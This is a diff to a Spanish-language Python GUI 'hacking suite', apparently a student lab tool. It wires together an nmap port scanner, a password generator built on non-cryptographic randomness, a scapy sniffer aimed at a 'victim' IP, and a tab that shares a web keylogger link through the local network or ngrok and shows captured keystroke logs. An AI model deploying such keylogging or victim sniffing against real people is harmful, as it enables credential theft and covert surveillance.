@@ -1,5 +1,4 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+
 import matplotlib
 matplotlib.use('Agg')
 
@@ -21,7 +20,6 @@ import webbrowser
 import socket
 from datetime import datetime
 
-# ------------------ CONFIGURACIÓN DE CARPETAS ------------------
 CAPTURAS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "capturas_sniffer")
 
 if not os.path.exists(CAPTURAS_DIR):
@@ -47,14 +45,12 @@ def obtener_ip_local():
     except Exception:
         return "127.0.0.1"
 
-# ------------------ GENERADOR DE CONTRASEÑAS ------------------
 def generar_contrasena(longitud):
     if longitud < 8:
         raise ValueError("Mínimo 8 caracteres")
     chars = string.ascii_letters + string.digits + string.punctuation
     return ''.join(random.choice(chars) for _ in range(longitud))
 
-# ------------------ ESCANEO DE PUERTOS (CORREGIDO) ------------------
 def escanear_puertos(host, rango, output_text):
     """Escanea puertos TCP usando nmap (modo -sT, no requiere sudo)"""
     try:
@@ -96,7 +92,6 @@ def escanear_puertos(host, rango, output_text):
     
     output_text.insert(tk.END, "✅ Escaneo completado.\n")
 
-# ------------------ SNIFFER MEJORADO CON GRÁFICOS OPTIMIZADOS ------------------
 def generar_grafico_pcap_mejorado(archivo_pcap, output_text, root, nombre_base, carpeta_destino):
     if not os.path.exists(archivo_pcap):
         output_text.insert(tk.END, f"❌ No se encuentra el archivo {archivo_pcap}\n")
@@ -355,7 +350,6 @@ def mostrar_ventana_grafico_completo(protocolos, total_paquetes, duracion, hist,
     canvas_plot.draw()
     canvas_plot.get_tk_widget().pack(fill=tk.BOTH, expand=True)
 
-# ------------------ CAPTURA DE TRÁFICO (GENERAL O ESPECÍFICA) ------------------
 def capturar_trafico(interfaz, tiempo, nombre_base, victim_ip, output_text, progress_bar, root):
     def capturar():
         if victim_ip:
@@ -373,7 +367,6 @@ def capturar_trafico(interfaz, tiempo, nombre_base, victim_ip, output_text, prog
         
         script_path = os.path.join(os.path.dirname(__file__), "sniffer_aux.py")
         
-        # Script auxiliar con formato de hora legible
         script_content = '''#!/usr/bin/env python3
 from scapy.all import sniff, wrpcap, IP
 import sys
@@ -503,7 +496,6 @@ print(f"✅ Información detallada guardada en {archivo_txt}")
     
     threading.Thread(target=capturar, daemon=True).start()
 
-# ------------------ KEYLOGGER WEB Y VISUALIZACIÓN ------------------
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 KEYLOGGER_LOG_FILE = os.path.join(BASE_DIR, "keylogger_boletos_blessd-main", "logs_blessd.txt")
 
@@ -541,7 +533,6 @@ def abrir_keylogger_web_local():
     ip_local = obtener_ip_local()
     webbrowser.open(f"http://{ip_local}:3000")
 
-# ------------------ INTERFAZ PRINCIPAL ------------------
 class HackingSuite:
     def __init__(self, root):
         self.root = root
@@ -573,7 +564,6 @@ class HackingSuite:
         self.notebook.add(self.tab_key, text="⌨️ Keylogger Web")
         self.setup_keylogger_tab()
     
-    # ------------------ ESCANEO ------------------
     def setup_scan_tab(self):
         frame = ttk.Frame(self.tab_scan, padding=10)
         frame.pack(fill=tk.BOTH, expand=True)
@@ -594,7 +584,6 @@ class HackingSuite:
         host = self.scan_host.get().strip()
         rango_str = self.scan_ports.get().strip()
         
-        # Validar formato del rango de puertos
         def validar_puerto(valor):
             try:
                 num = int(valor)
@@ -625,7 +614,6 @@ class HackingSuite:
         self.scan_output.delete(1.0, tk.END)
         threading.Thread(target=escanear_puertos, args=(host, rango_str, self.scan_output), daemon=True).start()
     
-    # ------------------ GENERADOR DE CONTRASEÑAS ------------------
     def setup_password_tab(self):
         frame = ttk.Frame(self.tab_pass, padding=10)
         frame.pack(fill=tk.BOTH, expand=True)
@@ -723,7 +711,6 @@ class HackingSuite:
         except Exception as e:
             messagebox.showerror("Error", str(e))
     
-    # ------------------ SNIFFER ------------------
     def setup_sniffer_tab(self):
         frame = ttk.Frame(self.tab_sniff, padding=10)
         frame.pack(fill=tk.BOTH, expand=True)
@@ -790,12 +777,10 @@ class HackingSuite:
         self.sniff_output.delete(1.0, tk.END)
         capturar_trafico(iface, tiempo, nombre_base, victim_ip, self.sniff_output, self.sniff_progress, self.root)
     
-    # ------------------ KEYLOGGER WEB ------------------
     def setup_keylogger_tab(self):
         frame = ttk.Frame(self.tab_key, padding=10)
         frame.pack(fill=tk.BOTH, expand=True)
 
-        # Sección superior con botones y link completo
         top_frame = ttk.Frame(frame)
         top_frame.pack(fill=tk.X, pady=5)
         ttk.Label(top_frame, text="Keylogger web (Node.js)", font=('Arial', 14)).pack(side=tk.LEFT, padx=5)
@@ -806,7 +791,6 @@ class HackingSuite:
         btn_open_local = ttk.Button(top_frame, text="Abrir IP local", command=abrir_keylogger_web_local)
         btn_open_local.pack(side=tk.RIGHT, padx=2)
 
-        # Mostrar el link completo para compartir
         ip_local = obtener_ip_local()
         link_completo = f"http://{ip_local}:3000/"
         
@@ -815,7 +799,6 @@ class HackingSuite:
         
         ttk.Label(link_frame, text="🔗 Link para compartir en red local:", font=('Arial', 10, 'bold')).pack(side=tk.LEFT, padx=5)
         
-        # Entry con el link completo (seleccionable)
         self.link_entry = ttk.Entry(link_frame, width=35, font=('Arial', 10))
         self.link_entry.insert(0, link_completo)
         self.link_entry.pack(side=tk.LEFT, padx=5)
@@ -824,12 +807,10 @@ class HackingSuite:
         btn_copy_link = ttk.Button(link_frame, text="📋 Copiar link", command=self.copiar_link_completo)
         btn_copy_link.pack(side=tk.LEFT, padx=5)
         
-        # También mostrar la IP en texto
         ttk.Label(frame, text=f"🌐 Tu IP local: {ip_local}:3000", foreground='blue', font=('Arial', 9)).pack(pady=2)
 
         ttk.Separator(frame, orient='horizontal').pack(fill='x', pady=10)
 
-        # Sección ngrok
         ngrok_frame = ttk.LabelFrame(frame, text="Compartir con compañero usando ngrok (internet)", padding=5)
         ngrok_frame.pack(fill=tk.X, pady=5)
         ttk.Label(ngrok_frame, text="Asegúrate de tener ngrok instalado y autenticado.\n(Si no: sudo snap install ngrok; ngrok config add-authtoken TU_TOKEN)",
@@ -847,7 +828,6 @@ class HackingSuite:
 
         ttk.Separator(frame, orient='horizontal').pack(fill='x', pady=10)
 
-        # Logs capturados
         logs_frame = ttk.LabelFrame(frame, text="Logs capturados (actualización automática cada 3 segundos)", padding=5)
         logs_frame.pack(fill=tk.BOTH, expand=True, pady=5)
         self.logs_text = scrolledtext.ScrolledText(logs_frame, height=15, width=80, wrap=tk.WORD)
